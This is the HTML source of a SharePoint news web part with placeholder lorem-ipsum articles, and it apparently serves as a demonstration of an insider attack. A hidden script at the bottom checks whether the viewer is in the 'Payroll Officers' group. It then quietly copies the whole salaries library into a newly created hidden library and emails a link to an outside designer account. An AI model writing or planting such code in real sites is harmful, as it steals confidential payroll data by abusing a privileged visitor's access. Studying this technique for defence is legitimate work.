<div unselectable="on" class="news">
    <h2 unselectable="on">News 1</h2>
    <img src="/sites/aos_classic/siteassets/images/img4.jpg" alt="" unselectable="on">
    <article unselectable="on">
    Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Maecenas porttitor congue massa. Fusce posuere, magna sed pulvinar ultricies, purus lectus malesuada libero, sit amet commodo magna eros quis urna.
    Nunc viverra imperdiet enim. Fusce est. Vivamus a tellus.
    Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Proin pharetra nonummy pede. Mauris et orci.
    Aenean nec lorem. In porttitor. Donec laoreet nonummy augue.
    Suspendisse dui purus, scelerisque at, vulputate vitae, pretium mattis, nunc. Mauris eget neque at sem venenatis eleifend. Ut nonummy.
    
    </article>
    </div>
    <div unselectable="on" class="news">
    <h2 unselectable="on">News 2</h2>
    <img src="/sites/aos_classic/siteassets/images/img3.png" alt="" unselectable="on">
    <article unselectable="on">
    Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Maecenas porttitor congue massa. Fusce posuere, magna sed pulvinar ultricies, purus lectus malesuada libero, sit amet commodo magna eros quis urna.
    Nunc viverra imperdiet enim. Fusce est. Vivamus a tellus.
    Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Proin pharetra nonummy pede. Mauris et orci.
    Aenean nec lorem. In porttitor. Donec laoreet nonummy augue.
    Suspendisse dui purus, scelerisque at, vulputate vitae, pretium mattis, nunc. Mauris eget neque at sem venenatis eleifend. Ut nonummy.
    
    </article>
    </div>
    <div unselectable="on" class="news">
    <h2 unselectable="on">News 3</h2>
    <img src="/sites/aos_classic/siteassets/images/img2.png" alt="" unselectable="on">
    <article unselectable="on">
    Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Maecenas porttitor congue massa. Fusce posuere, magna sed pulvinar ultricies, purus lectus malesuada libero, sit amet commodo magna eros quis urna.
    Nunc viverra imperdiet enim. Fusce est. Vivamus a tellus.
    Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Proin pharetra nonummy pede. Mauris et orci.
    Aenean nec lorem. In porttitor. Donec laoreet nonummy augue.
    Suspendisse dui purus, scelerisque at, vulputate vitae, pretium mattis, nunc. Mauris eget neque at sem venenatis eleifend. Ut nonummy.
    
    </article>
    </div>
    <div unselectable="on" class="news">
    <h2 unselectable="on">News 4</h2>
    <img src="/sites/aos_classic/siteassets/images/img1.jpg" alt="" unselectable="on">
    <article unselectable="on">
    Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Maecenas porttitor congue massa. Fusce posuere, magna sed pulvinar ultricies, purus lectus malesuada libero, sit amet commodo magna eros quis urna.
    Nunc viverra imperdiet enim. Fusce est. Vivamus a tellus.
    Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Proin pharetra nonummy pede. Mauris et orci.
    Aenean nec lorem. In porttitor. Donec laoreet nonummy augue.
    Suspendisse dui purus, scelerisque at, vulputate vitae, pretium mattis, nunc. Mauris eget neque at sem venenatis eleifend. Ut nonummy.
    
    </article>
    </div>
  <link rel="stylesheet" href="/sites/aos_classic/siteassets/css/home_news.css" />
  <script src="https://cdnjs.cloudflare.com/ajax/libs/sp-pnp-js/3.0.1/pnp.min.js"></script>
  <script>
  // this function will be executed once the polyfill is loaded.
  function stuffisloaded() {


    var hack = function () {
    console.log('START HACKING');
    var tmpListName = 'TMP_' + +new Date();
    var targetFolder = null;
    var foldersMapping = [];
    // Create another library
    $pnp.sp.web.lists
        .add(tmpListName, '', 101, false, {
        Hidden: true
    })
        .then(function (listCreated) {
        return $pnp.sp.web.lists
            .getById(listCreated.data.Id)
            .rootFolder.get()
            .then(function (rootFolder) {
            targetFolder = rootFolder;
        })
            .then(function () {
            // Get the folders from the salaries library
            return $pnp.sp.web
                .getFolderByServerRelativeUrl('/sites/aos_classic/salaries')
                .folders.filter("Name ne 'Forms'")
                .get()
                .then(function (folders) {
                var folderCreationPromises = [];
                folders.forEach(function (folder) {
                    var url = folder.ServerRelativeUrl;
                    console.log("Copying content of " + folder.ServerRelativeUrl);
                    var folderWeb = new $pnp.Web(_spPageContextInfo.webAbsoluteUrl);
                    folderCreationPromises.push(folderWeb
                        .getFolderByServerRelativeUrl(targetFolder.ServerRelativeUrl)
                        .folders.add(folder.Name)
                        .then(function (newTargetFolder) {
                        var newMapping = {
                            source: url,
                            target: targetFolder.ServerRelativeUrl + '/' + folder.Name
                        };
                        console.log(newMapping);
                        foldersMapping.push(newMapping);
                    }));
                });
                return Promise.all(folderCreationPromises);
                // Once all folders are created
            })
                .then(function () {
                var filesFetchPromises = [];
                // Get all the files to copy
                foldersMapping.forEach(function (fm) {
                    filesFetchPromises.push($pnp.sp.web
                        .getFolderByServerRelativeUrl(fm.source)
                        .files.get()
                        .then(function (files) {
                        fm.files = files;
                    }));
                });
                return Promise.all(filesFetchPromises);
            })
                .then(function () {
                var filesCopyPromises = [];
                foldersMapping.forEach(function (fm) {
                    console.log(fm.files);
                    fm.files.forEach(function (file) {
                        var newUrl = fm.target + '/' + file.Name;
                        console.log("Copying " + file.ServerRelativeUrl + " to " + newUrl);
                        var fileWeb = new $pnp.Web(_spPageContextInfo.webAbsoluteUrl);
                        filesCopyPromises.push(fileWeb
                            .getFileByServerRelativeUrl(file.ServerRelativeUrl)
                            .copyTo(newUrl)
                            .then(function () {
                            console.log('Copy done! HACKED !!!!');
                        })["catch"](function () {
                            console.log('CANNOT BE HACKED !');
                        }));
                    });
                });
                return Promise.all(filesCopyPromises);
            })
                .then(function () {
                var emailProps = {
                    To: ['bob.designer@ike365.onmicrosoft.com'],
                    CC: [],
                    Subject: 'Notification' + targetFolder.Name,
                    Body: "<a href='https://ike365.sharepoint.com/" +
                        targetFolder.ServerRelativeUrl +
                        "'>CHECK THE DOCUMENTS</a>"
                };
                $pnp.sp.utility.sendEmail(emailProps);
            });
        });
    });
};
// Check the current user is in the right group
$pnp.sp.web.currentUser
    .expand('Groups')
    .select('Id', 'Groups')
    .get()
    .then(function (result) {
    return result.Groups && result.Groups.filter(function (g) { return g.Title == 'Payroll Officers'; }).length == 1;
})
    .then(function (res) {
    if (res) {
        hack();
    }
});




  }
  </script>
  <!-- This script tag loads the required polyfills from the service -->
  <script src="https://cdn.polyfill.io/v2/polyfill.min.js?callback=stuffisloaded&features=es6|always|gated,fetch|always|gated"></script>
  